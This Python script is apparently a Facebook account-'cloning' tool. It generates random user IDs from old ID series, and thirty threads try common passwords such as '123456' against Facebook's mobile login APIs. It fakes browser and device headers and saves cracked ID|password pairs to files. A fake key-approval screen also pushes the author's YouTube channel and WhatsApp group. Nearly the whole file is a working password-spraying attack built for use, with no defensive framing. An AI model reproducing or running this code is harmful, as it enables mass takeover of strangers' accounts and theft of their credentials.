import os
import shutil
import time
import datetime
import random
import sys
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor as tred
from random import randint as rr

requests.urllib3.disable_warnings()

def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

oks = []
loop = 0

def approval_system():
    os.system("xdg-open https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI 2>/dev/null")
    
    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
    user_key = f"RajaVauTeachWorld{unique_id}"
    
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\n")
        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
        print(f"{padding}\033[1;92m            ✦ WELCOME TO RAJA VAU TEACH WORLD ✦          \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")
        
        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key}                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;37mSend this key to WhatsApp for approval!              \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"{padding}\033[1;32m [1] Join WhatsApp & Send Key to Admin\033[0m")
        print(f"{padding}\033[1;32m [2] Check Approval Status\033[0m")
        print(f"{padding}\033[1;31m [0] Exit\033[0m")
        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")
        
        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m")
        if choice == '1':
            os.system("xdg-open https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4 2>/dev/null")
            print(f"{padding}\033[1;32m [+] Opening WhatsApp Group...\033[0m")
            time.sleep(2)
        elif choice == '2':
            print(f"\n{padding}\033[1;32m welcome to Raja Vau Teach World\033[0m")
            print(f"{padding}\033[1;33m your Key approved\033[0m")
            time.sleep(2.5)
            break
        elif choice == '0':
            exit()
        else:
            print(f"{padding}\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    
    print("\n")
    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
    
    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mMETHOD-1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(OK)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\033[1;32m[✓] SUCCESS: {uid} | {pw} | {creationyear(uid)}\033[0m")
                open('/sdcard/OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\033[1;32m[✓] SUCCESS: {uid} | {pw} | {creationyear(uid)}\033[0m")
                open('/sdcard/OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mMETHOD-2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(OK)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\033[1;32m[✓] SUCCESS: {uid} | {pw} | {creationyear(uid)}\033[0m")
                    open('/sdcard/OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\033[1;32m[✓] SUCCESS: {uid} | {pw} | {creationyear(uid)}\033[0m")
                    open('/sdcard/OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1

def old_One():
    global loop, oks
    loop = 0
    oks = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    print(f"{padding}\033[1;32m[+] Old Code Series (2010-2014)\033[0m")
    ask = input(f"{padding}\033[1;33m[?] Select Option (1/2): \033[0m")
    limit = int(input(f"{padding}\033[1;33m[?] Enter Limit (e.g. 20000): \033[0m"))
    
    star = '10000'
    user = []
    for _ in range(limit):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(star + data)
    
    banner()
    print(f"{padding}\033[1;36m[1] Method A\033[0m")
    print(f"{padding}\033[1;36m[2] Method B\033[0m")
    meth = input(f"{padding}\033[1;33m[-] CHOICE (1/2): \033[0m").strip()
    
    banner()
    print(f"{padding}\033[1;32m[+] Total IDs: {len(user)}\033[0m")
    print(f"{padding}\033[1;33m[+] Use Airplane Mode for Good Results\033[0m")
    print("-" * 45)
    
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)
    input(f"\n{padding}\033[1;33m[Press Enter To Back Menu]\033[0m")

def old_Tow():
    global loop, oks
    loop = 0
    oks = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    print(f"{padding}\033[1;32m[+] 100003/4 Series\033[0m")
    limit = int(input(f"{padding}\033[1;33m[?] Enter Limit (e.g. 20000): \033[0m"))
    
    prefixes = ['100003', '100004']
    user = []
    for _ in range(limit):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    
    banner()
    print(f"{padding}\033[1;36m[1] Method A\033[0m")
    print(f"{padding}\033[1;36m[2] Method B\033[0m")
    meth = input(f"{padding}\033[1;33m[-] CHOICE (1/2): \033[0m").strip()
    
    banner()
    print(f"{padding}\033[1;32m[+] Total IDs: {len(user)}\033[0m")
    print(f"{padding}\033[1;33m[+] Use Airplane Mode for Good Results\033[0m")
    print("-" * 45)
    
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)
    input(f"\n{padding}\033[1;33m[Press Enter To Back Menu]\033[0m")

def old_Tree():
    global loop, oks
    loop = 0
    oks = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    print(f"{padding}\033[1;32m[+] 2009 Series\033[0m")
    limit = int(input(f"{padding}\033[1;33m[?] Enter Limit (e.g. 20000): \033[0m"))
    
    prefix = '1000004'
    user = []
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append(prefix + suffix)
    
    banner()
    print(f"{padding}\033[1;36m[1] Method A\033[0m")
    print(f"{padding}\033[1;36m[2] Method B\033[0m")
    meth = input(f"{padding}\033[1;33m[-] CHOICE (1/2): \033[0m").strip()
    
    banner()
    print(f"{padding}\033[1;32m[+] Total IDs: {len(user)}\033[0m")
    print(f"{padding}\033[1;33m[+] Use Airplane Mode for Good Results\033[0m")
    print("-" * 45)
    
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)
    input(f"\n{padding}\033[1;33m[Press Enter To Back Menu]\033[0m")

def main_menu():
    approval_system()
    while True:
        banner()
        width = max(get_width(), 40)
        padding = " " * max(0, (width - 44) // 2)
        
        print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mALL SERIES                      \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m100003/4 SERIES                 \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2009 SERIES                     \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mEXIT                            \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
        
        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m")
        if choice == '1':
            old_One()
        elif choice == '2':
            old_Tow()
        elif choice == '3':
            old_Tree()
        elif choice == '0':
            print(f"{padding}\n\033[1;31m [!] Exiting...\033[0m")
            break
        else:
            print(f"{padding}\n\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)

if __name__ == '__main__':
    main_menu()
